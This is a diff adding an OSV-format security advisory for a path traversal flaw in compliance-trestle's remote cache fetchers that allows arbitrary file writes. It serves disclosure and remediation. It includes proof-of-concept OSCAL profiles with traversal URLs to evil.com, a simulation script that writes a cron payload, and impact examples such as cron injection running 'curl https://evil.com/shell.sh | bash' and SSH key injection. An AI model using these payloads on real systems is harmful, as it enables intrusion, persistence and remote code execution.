@@ -1,0 +1,181 @@
+{
+  "id": "GHSA-g3vg-vx23-3858",
+  "modified": "2026-05-27T23:00:28.294488742Z",
+  "published": "2026-05-27T22:57:37Z",
+  "aliases": [
+    "CVE-2026-45725"
+  ],
+  "summary": "compliance-trestle Remote Fetching Mechanism has an Arbitrary File Write via Cache Path Traversal",
+  "details": "## Summary\n\nThe compliance-trestle library's remote fetching cache mechanism (HTTPSFetcher and SFTPFetcher) constructs the local cache file path from the URL path component without sanitizing path traversal sequences (`../`). When a remote OSCAL profile references a URL with traversal in its path, the HTTP response body is written to a location **outside the intended cache directory**, enabling **arbitrary file write with attacker-controlled content** to the filesystem.\n\n**Attack chain:** Malicious OSCAL profile → HTTPS fetch → cache path traversal → arbitrary file write → RCE (via cron, SSH keys, etc.)\n\n## Affected Component\n\n**Repository:** https://github.com/IBM/compliance-trestle\n**File:** `trestle/core/remote/cache.py` (lines 259-266 for HTTPSFetcher, lines 328-333 for SFTPFetcher)\n**Version:** v4.0.2 (latest as of 2026-04-30)\n## Vulnerable Code\n\n### cache.py:259-266 — HTTPSFetcher cache path construction\n\n```python\nclass HTTPSFetcher(FetcherBase):\n    def __init__(self, trestle_root: pathlib.Path, uri: str) -\u003e None:\n        # ...\n        u = parse.urlparse(self._uri)\n        # ...\n        if u.hostname is None:\n            raise TrestleError(f'Cache request for {self._uri} requires hostname')\n        https_cached_dir = self._trestle_cache_path / u.hostname\n        # ❌ path_parent preserves ../ sequences from URL\n        path_parent = pathlib.Path(u.path[re.search('[^/\\\\\\\\]', u.path).span()[0] :]).parent\n        https_cached_dir = https_cached_dir / path_parent\n        https_cached_dir.mkdir(parents=True, exist_ok=True)  # ❌ Creates dirs outside cache\n        self._cached_object_path = https_cached_dir / pathlib.Path(pathlib.Path(u.path).name)\n```\n\n### cache.py:285-295 — Content written to traversed path\n\n```python\n    def _do_fetch(self) -\u003e None:\n        # ...\n        response = requests.get(self._url, auth=auth, verify=verify, timeout=30)\n        if response.status_code == 200:\n            result = response.text  # ❌ Attacker-controlled content\n            self._cached_object_path.write_text(result)  # ❌ Written to arbitrary path\n```\n\n### cache.py:328-333 — SFTPFetcher (identical pattern)\n\n```python\nclass SFTPFetcher(FetcherBase):\n    def __init__(self, ...):\n        # Identical path construction — same vulnerability\n        sftp_cached_dir = self._trestle_cache_path / u.hostname\n        path_parent = pathlib.Path(u.path[re.search('[^/\\\\\\\\]', u.path).span()[0] :]).parent\n        sftp_cached_dir = sftp_cached_dir / path_parent\n        sftp_cached_dir.mkdir(parents=True, exist_ok=True)\n        self._cached_object_path = sftp_cached_dir / pathlib.Path(pathlib.Path(u.path).name)\n```\n\n**Root Cause:**\n1. `urlparse(\"https://evil.com/../../../tmp/pwned.json\").path` = `/../../../tmp/pwned.json` — preserves `../`\n2. `pathlib.Path(u.path).parent` preserves traversal sequences\n3. `cache_dir / hostname / \"../../../../../../tmp\"` resolves outside cache\n4. `mkdir(parents=True, exist_ok=True)` creates intermediate directories\n5. `write_text(response.text)` writes attacker-controlled content to traversed path\n6. **No `is_relative_to()` boundary check** on the resolved path\n\n\n## Steps to Reproduce\n\n### Prerequisites\n\n```bash\npip install compliance-trestle==4.0.2\n```\n\n### PoC: Malicious OSCAL Profile\n\n```yaml\n# malicious_profile.yaml — arbitrary file write via cache traversal\nprofile:\n  uuid: \"550e8400-e29b-41d4-a716-446655440000\"\n  metadata:\n    title: \"Malicious Profile\"\n    version: \"1.0\"\n    last-modified: \"2024-01-01T00:00:00+00:00\"\n    oscal-version: \"1.0.4\"\n  imports:\n    - href: \"https://evil.com/../../../../../../../tmp/trestle_pwned.json\"\n```\n\n### PoC: Cache Path Traversal Simulation\n\n```python\n#!/usr/bin/env python3\n\"\"\"PoC: Cache path traversal → arbitrary file write\"\"\"\nimport os, re, tempfile, shutil\nfrom pathlib import Path\nfrom urllib.parse import urlparse\n\n# Simulate trestle cache behavior (cache.py:259-266)\ntrestle_root = Path(tempfile.mkdtemp(prefix=\"trestle_poc_\"))\ncache_dir = trestle_root / \".trestle\" / \".cache\"\ncache_dir.mkdir(parents=True, exist_ok=True)\n\nevil_url = \"https://evil.com/../../../../../../../tmp/trestle_pwned.json\"\nu = urlparse(evil_url)\n\n# Exact trestle code path\ncached_dir = cache_dir / u.hostname\nm = re.search(r'[^/\\\\\\\\]', u.path)\npath_parent = Path(u.path[m.span()[0]:]).parent\ncached_dir = cached_dir / path_parent\ncached_dir.mkdir(parents=True, exist_ok=True)\ncached_file = cached_dir / Path(Path(u.path).name)\n\nprint(f\"Cache dir: {cache_dir}\")\nprint(f\"Resolved write target: {cached_file.resolve()}\")\n# Output: /tmp/trestle_pwned.json ← OUTSIDE cache directory!\n\n# Write attacker content\nattacker_payload = '*/5 * * * * root /bin/bash -c \"id \u003e /tmp/rce_proof\"'\ncached_file.write_text(attacker_payload)\nprint(f\"Written: {cached_file.resolve().read_text()}\")\n\n# Cleanup\nos.remove(str(cached_file.resolve()))\nshutil.rmtree(str(trestle_root))\n```\n\n**Expected:** Write confined to `.trestle/.cache/` directory\n**Actual:** File written to `/tmp/trestle_pwned.json` (arbitrary filesystem location)\n\n\n## Remediation\n\n### Fix for HTTPSFetcher (cache.py:259-266):\n\n```python\nclass HTTPSFetcher(FetcherBase):\n    def __init__(self, trestle_root: pathlib.Path, uri: str) -\u003e None:\n        # ...\n        u = parse.urlparse(self._uri)\n        https_cached_dir = self._trestle_cache_path / u.hostname\n\n        # ✅ Sanitize path: remove traversal sequences\n        safe_path = pathlib.PurePosixPath(u.path).parts\n        safe_path = [p for p in safe_path if p != '..' and p != '/']\n        path_parent = pathlib.Path(*safe_path[:-1]) if len(safe_path) \u003e 1 else pathlib.Path('.')\n\n        https_cached_dir = https_cached_dir / path_parent\n        https_cached_dir.mkdir(parents=True, exist_ok=True)\n        self._cached_object_path = https_cached_dir / safe_path[-1]\n\n        # ✅ Boundary check\n        if not self._cached_object_path.resolve().is_relative_to(self._trestle_cache_path.resolve()):\n            raise TrestleError(\n                f\"Cache path traversal blocked: URL '{uri}' resolves to \"\n                f\"'{self._cached_object_path.resolve()}' outside cache directory\"\n            )\n```\n\nSame fix required for SFTPFetcher at lines 328-333.\n\n## References\n\n- **CWE-22:** https://cwe.mitre.org/data/definitions/22.html\n- **CWE-73:** https://cwe.mitre.org/data/definitions/73.html\n- **compliance-trestle:** https://github.com/IBM/compliance-trestle\n\n## Impact\n\n### 1. Cron Job Injection → Remote Code Execution\n\n```yaml\n# Profile that writes a cron job\nimports:\n  - href: \"https://evil.com/../../../../../../../etc/cron.d/backdoor\"\n```\n\nAttacker's server responds with:\n```\n* * * * * root /bin/bash -c 'curl https://evil.com/shell.sh | bash'\n```\n\n### 2. SSH Authorized Keys Injection\n\n```yaml\nimports:\n  - href: \"https://evil.com/../../../../../../../root/.ssh/authorized_keys\"\n```\n\nAttacker's server responds with their SSH public key.\n\n### 3. Config File Overwrite\n\n```yaml\nimports:\n  - href: \"https://evil.com/../../../../../../../etc/nginx/conf.d/evil.conf\"\n```\n\n### 4. Python Path Hijacking\n\nWrite malicious `.py` file to a location on `sys.path` for code execution on next import.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "compliance-trestle",
+        "purl": "pkg:pypi/compliance-trestle"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "4.0.0"
+            },
+            {
+              "fixed": "4.0.3"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "4.0.0",
+        "4.0.1",
+        "4.0.2"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 4.0.2",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-g3vg-vx23-3858/GHSA-g3vg-vx23-3858.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "compliance-trestle",
+        "purl": "pkg:pypi/compliance-trestle"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.12.2"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.2",
+        "0.0.3",
+        "0.1.0",
+        "0.1.1",
+        "0.10.0",
+        "0.11.0",
+        "0.12.0",
+        "0.13.0",
+        "0.13.1",
+        "0.14.0",
+        "0.14.1",
+        "0.14.2",
+        "0.14.3",
+        "0.14.4",
+        "0.15.0",
+        "0.15.1",
+        "0.16.0",
+        "0.17.0",
+        "0.18.0",
+        "0.18.1",
+        "0.19.0",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.20.0",
+        "0.21.0",
+        "0.22.0",
+        "0.22.1",
+        "0.23.0",
+        "0.24.0",
+        "0.25.0",
+        "0.25.1",
+        "0.26.0",
+        "0.27.0",
+        "0.27.1",
+        "0.27.2",
+        "0.28.0",
+        "0.28.1",
+        "0.29.0",
+        "0.3.0",
+        "0.30.0",
+        "0.31.0",
+        "0.32.0",
+        "0.32.1",
+        "0.33.0",
+        "0.34.0",
+        "0.35.0",
+        "0.36.0",
+        "0.37.0",
+        "0.4.0",
+        "0.5.0",
+        "0.6.0",
+        "0.6.1",
+        "0.6.2",
+        "0.7.0",
+        "0.7.1",
+        "0.7.2",
+        "0.8.0",
+        "0.8.1",
+        "0.9.0",
+        "1.0.0rc0",
+        "1.0.1",
+        "1.0.2",
+        "1.1.0",
+        "1.2.0",
+        "2.0.0",
+        "2.1.0",
+        "2.1.1",
+        "2.2.0",
+        "2.2.1",
+        "2.3.0",
+        "2.3.1",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.6.0",
+        "2.6.1",
+        "3.0.1",
+        "3.1.0",
+        "3.10.2",
+        "3.10.3",
+        "3.10.4",
+        "3.11.0",
+        "3.12.0",
+        "3.12.1",
+        "3.2.0",
+        "3.3.0",
+        "3.4.0",
+        "3.5.0",
+        "3.6.0",
+        "3.7.0",
+        "3.8.0",
+        "3.8.1",
+        "3.9.0",
+        "3.9.1",
+        "3.9.2",
+        "3.9.3"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-g3vg-vx23-3858/GHSA-g3vg-vx23-3858.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/oscal-compass/compliance-trestle/security/advisories/GHSA-g3vg-vx23-3858"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/oscal-compass/compliance-trestle/commit/89f4e53d159e8ff901da4d7c3b51c9556bd32ec0"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/oscal-compass/compliance-trestle/commit/9abc492329fcc8d0557182317de9bde854385da3"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/oscal-compass/compliance-trestle"
+    }
+  ]
+}
